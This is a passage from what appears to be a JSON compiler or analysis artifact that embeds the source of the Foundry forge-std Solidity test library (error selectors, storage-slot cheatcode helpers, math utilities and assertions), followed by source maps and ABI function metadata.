i++) {\n                number = number + uint(uint8(b[i]))*(2**(8*(b.length-(i+1))));\n            }\n        return number;\n    }\n\n}\n\n/*//////////////////////////////////////////////////////////////////////////\n                                STD-ERRORS\n//////////////////////////////////////////////////////////////////////////*/\n\nlibrary stdError {\n    bytes public constant assertionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x01);\n    bytes public constant arithmeticError = abi.encodeWithSignature(\"Panic(uint256)\", 0x11);\n    bytes public constant divisionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x12);\n    bytes public constant enumConversionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x21);\n    bytes public constant encodeStorageError = abi.encodeWithSignature(\"Panic(uint256)\", 0x22);\n    bytes public constant popError = abi.encodeWithSignature(\"Panic(uint256)\", 0x31);\n    bytes public constant indexOOBError = abi.encodeWithSignature(\"Panic(uint256)\", 0x32);\n    bytes public constant memOverflowError = abi.encodeWithSignature(\"Panic(uint256)\", 0x41);\n    bytes public constant zeroVarError = abi.encodeWithSignature(\"Panic(uint256)\", 0x51);\n    // DEPRECATED: Use Vm's `expectRevert` without any arguments instead\n    bytes public constant lowLevelError = bytes(\"\"); // `0x`\n}\n\n/*//////////////////////////////////////////////////////////////////////////\n                                STD-STORAGE\n//////////////////////////////////////////////////////////////////////////*/\n\nstruct StdStorage {\n    mapping (address => mapping(bytes4 => mapping(bytes32 => uint256))) slots;\n    mapping (address => mapping(bytes4 =>  mapping(bytes32 => bool))) finds;\n\n    bytes32[] _keys;\n    bytes4 _sig;\n    uint256 _depth;\n    address _target;\n    bytes32 _set;\n}\n\nlibrary stdStorage {\n    event SlotFound(address who, bytes4 fsig, bytes32 keysHash, uint slot);\n    event WARNING_UninitedSlot(address who, uint slot);\n\n    uint256 private constant UINT256_MAX = 115792089237316195423570985008687907853269984665640564039457584007913129639935;\n    int256 private constant INT256_MAX = 57896044618658097711785492504343953926634992332820282019728792003956564819967;\n\n    Vm private constant vm_std_store = Vm(address(uint160(uint256(keccak256('hevm cheat code')))));\n\n    function sigs(\n        string memory sigStr\n    )\n        internal\n        pure\n        returns (bytes4)\n    {\n        return bytes4(keccak256(bytes(sigStr)));\n    }\n\n    /// @notice find an arbitrary storage slot given a function sig, input data, address of the contract and a value to check against\n    // slot complexity:\n    //  if flat, will be bytes32(uint256(uint));\n    //  if map, will be keccak256(abi.encode(key, uint(slot)));\n    //  if deep map, will be keccak256(abi.encode(key1, keccak256(abi.encode(key0, uint(slot)))));\n    //  if map struct, will be bytes32(uint256(keccak256(abi.encode(key1, keccak256(abi.encode(key0, uint(slot)))))) + structFieldDepth);\n    function find(\n        StdStorage storage self\n    )\n        internal\n        returns (uint256)\n    {\n        address who = self._target;\n        bytes4 fsig = self._sig;\n        uint256 field_depth = self._depth;\n        bytes32[] memory ins = self._keys;\n\n        // calldata to test against\n        if (self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))]) {\n            return self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))];\n        }\n        bytes memory cald = abi.encodePacked(fsig, flatten(ins));\n        vm_std_store.record();\n        bytes32 fdat;\n        {\n            (, bytes memory rdat) = who.staticcall(cald);\n            fdat = bytesToBytes32(rdat, 32*field_depth);\n        }\n\n        (bytes32[] memory reads, ) = vm_std_store.accesses(address(who));\n        if (reads.length == 1) {\n            bytes32 curr = vm_std_store.load(who, reads[0]);\n            if (curr == bytes32(0)) {\n                emit WARNING_UninitedSlot(who, uint256(reads[0]));\n            }\n            if (fdat != curr) {\n                require(false, \"stdStorage find(StdStorage): Packed slot. This would cause dangerous overwriting and currently isn't supported.\");\n            }\n            emit SlotFound(who, fsig, keccak256(abi.encodePacked(ins, field_depth)), uint256(reads[0]));\n            self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = uint256(reads[0]);\n            self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = true;\n        } else if (reads.length > 1) {\n            for (uint256 i = 0; i < reads.length; i++) {\n                bytes32 prev = vm_std_store.load(who, reads[i]);\n                if (prev == bytes32(0)) {\n                    emit WARNING_UninitedSlot(who, uint256(reads[i]));\n                }\n                // store\n                vm_std_store.store(who, reads[i], bytes32(hex\"1337\"));\n                bool success;\n                bytes memory rdat;\n                {\n                    (success, rdat) = who.staticcall(cald);\n                    fdat = bytesToBytes32(rdat, 32*field_depth);\n                }\n\n                if (success && fdat == bytes32(hex\"1337\")) {\n                    // we found which of the slots is the actual one\n                    emit SlotFound(who, fsig, keccak256(abi.encodePacked(ins, field_depth)), uint256(reads[i]));\n                    self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = uint256(reads[i]);\n                    self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = true;\n                    vm_std_store.store(who, reads[i], prev);\n                    break;\n                }\n                vm_std_store.store(who, reads[i], prev);\n            }\n        } else {\n            require(false, \"stdStorage find(StdStorage): No storage use detected for target.\");\n        }\n\n        require(self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))], \"stdStorage find(StdStorage): Slot(s) not found.\");\n\n        delete self._target;\n        delete self._sig;\n        delete self._keys;\n        delete self._depth;\n\n        return self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))];\n    }\n\n    function target(StdStorage storage self, address _target) internal returns (StdStorage storage) {\n        self._target = _target;\n        return self;\n    }\n\n    function sig(StdStorage storage self, bytes4 _sig) internal returns (StdStorage storage) {\n        self._sig = _sig;\n        return self;\n    }\n\n    function sig(StdStorage storage self, string memory _sig) internal returns (StdStorage storage) {\n        self._sig = sigs(_sig);\n        return self;\n    }\n\n    function with_key(StdStorage storage self, address who) internal returns (StdStorage storage) {\n        self._keys.push(bytes32(uint256(uint160(who))));\n        return self;\n    }\n\n    function with_key(StdStorage storage self, uint256 amt) internal returns (StdStorage storage) {\n        self._keys.push(bytes32(amt));\n        return self;\n    }\n    function with_key(StdStorage storage self, bytes32 key) internal returns (StdStorage storage) {\n        self._keys.push(key);\n        return self;\n    }\n\n    function depth(StdStorage storage self, uint256 _depth) internal returns (StdStorage storage) {\n        self._depth = _depth;\n        return self;\n    }\n\n    function checked_write(StdStorage storage self, address who) internal {\n        checked_write(self, bytes32(uint256(uint160(who))));\n    }\n\n    function checked_write(StdStorage storage self, uint256 amt) internal {\n        checked_write(self, bytes32(amt));\n    }\n\n    function checked_write(StdStorage storage self, bool write) internal {\n        bytes32 t;\n        /// @solidity memory-safe-assembly\n        assembly {\n            t := write\n        }\n        checked_write(self, t);\n    }\n\n    function checked_write(\n        StdStorage storage self,\n        bytes32 set\n    ) internal {\n        address who = self._target;\n        bytes4 fsig = self._sig;\n        uint256 field_depth = self._depth;\n        bytes32[] memory ins = self._keys;\n\n        bytes memory cald = abi.encodePacked(fsig, flatten(ins));\n        if (!self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))]) {\n            find(self);\n        }\n        bytes32 slot = bytes32(self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))]);\n\n        bytes32 fdat;\n        {\n            (, bytes memory rdat) = who.staticcall(cald);\n            fdat = bytesToBytes32(rdat, 32*field_depth);\n        }\n        bytes32 curr = vm_std_store.load(who, slot);\n\n        if (fdat != curr) {\n            require(false, \"stdStorage find(StdStorage): Packed slot. This would cause dangerous overwriting and currently isn't supported.\");\n        }\n        vm_std_store.store(who, slot, set);\n        delete self._target;\n        delete self._sig;\n        delete self._keys;\n        delete self._depth;\n    }\n\n    function read(StdStorage storage self) private returns (bytes memory) {\n        address t = self._target;\n        uint256 s = find(self);\n        return abi.encode(vm_std_store.load(t, bytes32(s)));\n    }\n\n    function read_bytes32(StdStorage storage self) internal returns (bytes32) {\n        return abi.decode(read(self), (bytes32));\n    }\n\n\n    function read_bool(StdStorage storage self) internal returns (bool) {\n        int256 v = read_int(self);\n        if (v == 0) return false;\n        if (v == 1) return true;\n        revert(\"stdStorage read_bool(StdStorage): Cannot decode. Make sure you are reading a bool.\");\n    }\n\n    function read_address(StdStorage storage self) internal returns (address) {\n        return abi.decode(read(self), (address));\n    }\n\n    function read_uint(StdStorage storage self) internal returns (uint256) {\n        return abi.decode(read(self), (uint256));\n    }\n\n    function read_int(StdStorage storage self) internal returns (int256) {\n        return abi.decode(read(self), (int256));\n    }\n\n    function bytesToBytes32(bytes memory b, uint offset) public pure returns (bytes32) {\n        bytes32 out;\n\n        uint256 max = b.length > 32 ? 32 : b.length;\n        for (uint i = 0; i < max; i++) {\n            out |= bytes32(b[offset + i] & 0xFF) >> (i * 8);\n        }\n        return out;\n    }\n\n    function flatten(bytes32[] memory b) private pure returns (bytes memory)\n    {\n        bytes memory result = new bytes(b.length * 32);\n        for (uint256 i = 0; i < b.length; i++) {\n            bytes32 k = b[i];\n            /// @solidity memory-safe-assembly\n            assembly {\n                mstore(add(result, add(32, mul(32, i))), k)\n            }\n        }\n\n        return result;\n    }\n\n\n\n}\n\n\n/*//////////////////////////////////////////////////////////////////////////\n                                STD-MATH\n//////////////////////////////////////////////////////////////////////////*/\n\nlibrary stdMath {\n    int256 private constant INT256_MIN = -57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    function abs(int256 a) internal pure returns (uint256) {\n        // Required or it will fail when `a = type(int256).min`\n        if (a == INT256_MIN)\n            return 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n        return uint256(a > 0 ? a : -a);\n    }\n\n    function delta(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a > b\n            ? a - b\n            : b - a;\n    }\n\n    function delta(int256 a, int256 b) internal pure returns (uint256) {\n        // a and b are of the same sign\n        // this works thanks to two's complement, the left-most bit is the sign bit\n        if ((a ^ b) > -1) {\n            return delta(abs(a), abs(b));\n        }\n\n        // a and b are of opposite signs\n        return abs(a) + abs(b);\n    }\n\n    function percentDelta(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 absDelta = delta(a, b);\n\n        return absDelta * 1e18 / b;\n    }\n\n    function percentDelta(int256 a, int256 b) internal pure returns (uint256) {\n        uint256 absDelta = delta(a, b);\n        uint256 absB = abs(b);\n\n        return absDelta * 1e18 / absB;\n    }\n}\n","sourceMap":"26222:984:21:-:0;;;;;;;;;;;;;;;-1:-1:-1;;;26222:984:21;;;;;;;;;;;;;;;;;","sourceMapDeployed":"26222:984:21:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;26800:85;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;26245:86;;;:::i;26521:91::-;;;:::i;26337:87::-;;;:::i;26891:88::-;;;:::i;27148:47::-;;27186:9;;;;;;;;;;;;27148:47;;26714:80;;;:::i;26985:84::-;;;:::i;26618:90::-;;;:::i;26430:85::-;;;:::i;26800:::-;26838:47;;26880:4;26838:47;;;726:36:29;699:18;;26838:47:21;;;;-1:-1:-1;;26838:47:21;;;;;;;;;;;;;;-1:-1:-1;;;;;26838:47:21;-1:-1:-1;;;26838:47:21;;;26800:85;:::o;26245:86::-;26284:47;;26326:4;26284:47;;;726:36:29;699:18;;26284:47:21;573:195:29;26521:91:21;26565:47;;26607:4;26565:47;;;726:36:29;699:18;;26565:47:21;573:195:29;26337:87:21;26377:47;;26419:4;26377:47;;;726:36:29;699:18;;26377:47:21;573:195:29;26891:88:21;26932:47;;26974:4;26932:47;;;726:36:29;699:18;;26932:47:21;573:195:29;26714:80:21;26747:47;;26789:4;26747:47;;;726:36:29;699:18;;26747:47:21;573:195:29;26985:84:21;27022:47;;27064:4;27022:47;;;726:36:29;699:18;;27022:47:21;573:195:29;26618:90:21;26661:47;;26703:4;26661:47;;;726:36:29;699:18;;26661:47:21;573:195:29;26430:85:21;26468:47;;26510:4;26468:47;;;726:36:29;699:18;;26468:47:21;573:195:29;14:554;132:4;161:2;190;179:9;172:21;222:6;216:13;265:6;260:2;249:9;245:18;238:34;290:1;300:140;314:6;311:1;308:13;300:140;;;409:14;;;405:23;;399:30;375:17;;;394:2;371:26;364:66;329:10;;300:140;;;304:3;489:1;484:2;475:6;464:9;460:22;456:31;449:42;559:2;552;548:7;543:2;535:6;531:15;527:29;516:9;512:45;508:54;500:62;;;;14:554;;;;:::o","constructor":null,"functions":[{"id":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError:arithmeticError()(bytes)","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError","signature":"arithmeticError():(bytes)","shortSignature":"8995290f","name":"arithmeticError","inputs":[],"outputs":[{"name":"","kind":"Bytes","internalType":"bytes"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError:assertionError()(bytes)","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError","signature":"assertionError():(bytes)","shortSignature":"10332977","name":"assertionError","inputs":[],"outputs":[{"name":"","kind":"Bytes","internalType":"bytes"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError:divisionError()(bytes)","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError","signature":"divisionError():(bytes)","shortSignature":"fa784a44","name":"divisionError","inputs":[],"outputs":[{"name":"","kind":"Bytes","internalType":"bytes"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError:encodeStorageError()(bytes)","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError","signature":"encodeStorageError():(bytes)","shortSignature":"d160e4de","name":"encodeStorageError","inputs":[],"outputs":[{"name":"","kind":"Bytes","internalType":"bytes"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError:enumConversionError()(bytes)","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError","signature":"enumConversionError():(bytes)","shortSignature":"1de45560","name":"enumConversionError","inputs":[],"outputs":[{"name":"","kind":"Bytes","internalType":"bytes"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError:indexOOBError()(bytes)","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError","signature":"indexOOBError():(bytes)","shortSignature":"05ee8612","name":"indexOOBError","inputs":[],"outputs":[{"name":"","kind":"Bytes","internalType":"bytes"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError:lowLevelError()(bytes)","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError","signature":"lowLevelError():(bytes)","shortSignature":"ac3d92c6","name":"lowLevelError","inputs":[],"outputs":[{"name":"","kind":"Bytes","internalType":"bytes"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError:memOverflowError()(bytes)","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError","signature":"memOverflowError():(bytes)","shortSignature":"986c5f68","name":"memOverflowError","inputs":[],"outputs":[{"name":"","kind":"Bytes","internalType":"bytes"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError:popError()(bytes)","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError","signature":"popError():(bytes)","shortSignature":"b22dc54d","name":"popError","inputs":[],"outputs":[{"name":"","kind":"Bytes","internalType":"bytes"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError:zeroVarError()(bytes)","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError","signature":"zeroVarError():(bytes)","shortSignature":"b67689da","name":"zeroVarError","inputs":[],"outputs":[{"name":"","kind":"Bytes","internalType":"bytes"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false}],"functionalLines":[]},{"name":"stdMath","artifactPath":"out/Test.sol/stdMath.json","sourcePath":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdMath","sourceFileId":21,"sourceContent":"// SPDX-License-Identifier: MIT\npragma solidity >=0.6.0 <0.9.0;\npragma experimental ABIEncoderV2;\n\nimport \"./Script.sol\";\nimport \"ds-test/test.sol\";\n\n// Wrappers around Cheatcodes to avoid footguns\nabstract contract Test is DSTest, Script {\n    using stdStorage for StdStorage;\n\n    uint256 internal constant UINT256_MAX =\n        115792089237316195423570985008687907853269984665640564039457584007913129639935;\n\n    StdStorage internal stdstore;\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                    STD-LOGS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    event log_array(uint256[] val);\n    event log_array(int256[] val);\n    event log_array(address[] val);\n    event log_named_array(string key, uint256[] val);\n    event log_named_array(string key, int256[] val);\n    event log_named_array(string key, address[] val);\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                    STD-CHEATS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    // Skip forward or rewind time by the specified number of seconds\n    function skip(uint256 time) internal {\n        vm.warp(block.timestamp + time);\n    }\n\n    function rewind(uint256 time) internal {\n        vm.warp(block.timestamp - time);\n    }\n\n    // Setup a prank from an address that has some ether\n    function hoax(address who) internal {\n        vm.deal(who, 1 << 128);\n        vm.prank(who);\n    }\n\n    function hoax(address who, uint256 give) internal {\n        vm.deal(who, give);\n        vm.prank(who);\n    }\n\n    function hoax(address who, address origin) internal {\n        vm.deal(who, 1 << 128);\n        vm.prank(who, origin);\n    }\n\n    function hoax(address who, address origin, uint256 give) internal {\n        vm.deal(who, give);\n        vm.prank(who, origin);\n    }\n\n    // Start perpetual prank from an address that has some ether\n    function startHoax(address who) internal {\n        vm.deal(who, 1 << 128);\n        vm.startPrank(who);\n    }\n\n    function startHoax(address who, uint256 give) internal {\n        vm.deal(who, give);\n        vm.startPrank(who);\n    }\n\n    // Start perpetual prank from an address that has some ether\n    // tx.origin is set to the origin parameter\n    function startHoax(address who, address origin) internal {\n        vm.deal(who, 1 << 128);\n        vm.startPrank(who, origin);\n    }\n\n    function startHoax(address who, address origin, uint256 give) internal {\n        vm.deal(who, give);\n        vm.startPrank(who, origin);\n    }\n\n    function changePrank(address who) internal {\n        vm.stopPrank();\n        vm.startPrank(who);\n    }\n\n    // creates a labeled address and the corresponding private key\n    function makeAddrAndKey(string memory name) internal returns(address addr, uint256 privateKey) {\n        privateKey = uint256(keccak256(abi.encodePacked(name)));\n        addr = vm.addr(privateKey);\n        vm.label(addr, name);\n    }\n\n    // creates a labeled address\n    function makeAddr(string memory name) internal returns(address addr) {\n        (addr,) = makeAddrAndKey(name);\n    }\n\n    // DEPRECATED: Use `deal` instead\n    function tip(address token, address to, uint256 give) internal {\n        emit log_named_string(\"WARNING\", \"Test tip(address,address,uint256): The `tip` stdcheat has been deprecated. Use `deal` instead.\");\n        stdstore\n            .target(token)\n            .sig(0x70a08231)\n            .with_key(to)\n            .checked_write(give);\n    }\n\n    // The same as Vm's `deal`\n    // Use the alternative signature for ERC20 tokens\n    function deal(address to, uint256 give) internal {\n        vm.deal(to, give);\n    }\n\n    // Set the balance of an account for any ERC20 token\n    // Use the alternative signature to update `totalSupply`\n    function deal(address token, address to, uint256 give) internal {\n        deal(token, to, give, false);\n    }\n\n    function deal(address token, address to, uint256 give, bool adjust) internal {\n        // get current balance\n        (, bytes memory balData) = token.call(abi.encodeWithSelector(0x70a08231, to));\n        uint256 prevBal = abi.decode(balData, (uint256));\n\n        // update balance\n        stdstore\n            .target(token)\n            .sig(0x70a08231)\n            .with_key(to)\n            .checked_write(give);\n\n        // update total supply\n        if(adjust){\n            (, bytes memory totSupData) = token.call(abi.encodeWithSelector(0x18160ddd));\n            uint256 totSup = abi.decode(totSupData, (uint256));\n            if(give < prevBal) {\n                totSup -= (prevBal - give);\n            } else {\n                totSup += (give - prevBal);\n            }\n            stdstore\n                .target(token)\n                .sig(0x18160ddd)\n                .checked_write(totSup);\n        }\n    }\n\n    function bound(uint256 x, uint256 min, uint256 max) internal virtual returns (uint256 result) {\n        require(min <= max, \"Test bound(uint256,uint256,uint256): Max is less than min.\");\n\n        uint256 size = max - min;\n\n        if (size == 0)\n        {\n            result = min;\n        }\n        else if (size == UINT256_MAX)\n        {\n            result = x;\n        }\n        else\n        {\n            ++size; // make `max` inclusive\n            uint256 mod = x % size;\n            result = min + mod;\n        }\n\n        emit log_named_uint(\"Bound Result\", result);\n    }\n\n    // Deploy a contract by fetching the contract bytecode from\n    // the artifacts directory\n    // e.g. `deployCode(code, abi.encode(arg1,arg2,arg3))`\n    function deployCode(string memory what, bytes memory args)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = abi.encodePacked(vm.getCode(what), args);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string,bytes): Deployment failed.\"\n        );\n    }\n\n    function deployCode(string memory what)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = vm.getCode(what);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string): Deployment failed.\"\n        );\n    }\n\n    /// deploy contract with value on construction\n    function deployCode(string memory what, bytes memory args, uint256 val)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = abi.encodePacked(vm.getCode(what), args);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(val, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string,bytes,uint256): Deployment failed.\"\n        );\n    }\n\n    function deployCode(string memory what, uint256 val)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = vm.getCode(what);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(val, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string,uint256): Deployment failed.\"\n        );\n    }\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                    STD-ASSERTIONS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function fail(string memory err) internal virtual {\n        emit log_named_string(\"Error\", err);\n        fail();\n    }\n\n    function assertFalse(bool data) internal virtual {\n        assertTrue(!data);\n    }\n\n    function assertFalse(bool data, string memory err) internal virtual {\n        assertTrue(!data, err);\n    }\n\n    function assertEq(bool a, bool b) internal {\n        if (a != b) {\n            emit log                (\"Error: a == b not satisfied [bool]\");\n            emit log_named_string   (\"  Expected\", b ? \"true\" : \"false\");\n            emit log_named_string   (\"    Actual\", a ? \"true\" : \"false\");\n            fail();\n        }\n    }\n\n    function assertEq(bool a, bool b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEq(bytes memory a, bytes memory b) internal {\n        assertEq0(a, b);\n    }\n\n    function assertEq(bytes memory a, bytes memory b, string memory err) internal {\n        assertEq0(a, b, err);\n    }\n\n    function assertEq(uint256[] memory a, uint256[] memory b) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log(\"Error: a == b not satisfied [uint[]]\");\n            emit log_named_array(\"  Expected\", b);\n            emit log_named_array(\"    Actual\", a);\n            fail();\n        }\n    }\n\n    function assertEq(int256[] memory a, int256[] memory b) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log(\"Error: a == b not satisfied [int[]]\");\n            emit log_named_array(\"  Expected\", b);\n            emit log_named_array(\"    Actual\", a);\n            fail();\n        }\n    }\n\n    function assertEq(address[] memory a, address[] memory b) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log(\"Error: a == b not satisfied [address[]]\");\n            emit log_named_array(\"  Expected\", b);\n            emit log_named_array(\"    Actual\", a);\n            fail();\n        }\n    }\n\n    function assertEq(uint256[] memory a, uint256[] memory b, string memory err) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEq(int256[] memory a, int256[] memory b, string memory err) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n\n    function assertEq(address[] memory a, address[] memory b, string memory err) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEqUint(uint256 a, uint256 b) internal {\n        assertEq(uint256(a), uint256(b));\n    }\n\n    function assertApproxEqAbs(\n        uint256 a,\n        uint256 b,\n        uint256 maxDelta\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log            (\"Error: a ~= b not satisfied [uint]\");\n            emit log_named_uint (\"  Expected\", b);\n            emit log_named_uint (\"    Actual\", a);\n            emit log_named_uint (\" Max Delta\", maxDelta);\n            emit log_named_uint (\"     Delta\", delta);\n            fail();\n        }\n    }\n\n    function assertApproxEqAbs(\n        uint256 a,\n        uint256 b,\n        uint256 maxDelta,\n        string memory err\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log_named_string   (\"Error\", err);\n            assertApproxEqAbs(a, b, maxDelta);\n        }\n    }\n\n    function assertApproxEqAbs(\n        int256 a,\n        int256 b,\n        uint256 maxDelta\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log            (\"Error: a ~= b not satisfied [int]\");\n            emit log_named_int  (\"  Expected\", b);\n            emit log_named_int  (\"    Actual\", a);\n            emit log_named_uint (\" Max Delta\", maxDelta);\n            emit log_named_uint (\"     Delta\", delta);\n            fail();\n        }\n    }\n\n    function assertApproxEqAbs(\n        int256 a,\n        int256 b,\n        uint256 maxDelta,\n        string memory err\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log_named_string   (\"Error\", err);\n            assertApproxEqAbs(a, b, maxDelta);\n        }\n    }\n\n    function assertApproxEqRel(\n        uint256 a,\n        uint256 b,\n        uint256 maxPercentDelta // An 18 decimal fixed point number, where 1e18 == 100%\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log                    (\"Error: a ~= b not satisfied [uint]\");\n            emit log_named_uint         (\"    Expected\", b);\n            emit log_named_uint         (\"      Actual\", a);\n            emit log_named_decimal_uint (\" Max % Delta\", maxPercentDelta, 18);\n            emit log_named_decimal_uint (\"     % Delta\", percentDelta, 18);\n            fail();\n        }\n    }\n\n    function assertApproxEqRel(\n        uint256 a,\n        uint256 b,\n        uint256 maxPercentDelta, // An 18 decimal fixed point number, where 1e18 == 100%\n        string memory err\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b, err); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log_named_string       (\"Error\", err);\n            assertApproxEqRel(a, b, maxPercentDelta);\n        }\n    }\n\n    function assertApproxEqRel(\n        int256 a,\n        int256 b,\n        uint256 maxPercentDelta\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log                   (\"Error: a ~= b not satisfied [int]\");\n            emit log_named_int         (\"    Expected\", b);\n            emit log_named_int         (\"      Actual\", a);\n            emit log_named_decimal_uint(\" Max % Delta\", maxPercentDelta, 18);\n            emit log_named_decimal_uint(\"     % Delta\", percentDelta, 18);\n            fail();\n        }\n    }\n\n    function assertApproxEqRel(\n        int256 a,\n        int256 b,\n        uint256 maxPercentDelta,\n        string memory err\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log_named_string      (\"Error\", err);\n            assertApproxEqRel(a, b, maxPercentDelta);\n        }\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                              JSON PARSING\n    //////////////////////////////////////////////////////////////*/\n\n   // Data structures to parse Transaction objects from the broadcast artifact\n   // that conform to EIP1559. The Raw structs is what is parsed from the JSON\n   // and then converted to the one that is used by the user for better UX.\n\n   struct RawTx1559 {\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        // json value name = function\n        string functionSig;\n        bytes32 hash;\n        // json value name = tx\n        RawTx1559Detail txDetail;\n        // json value name = type\n        string opcode;\n    }\n\n    struct RawTx1559Detail {\n        AccessList[] 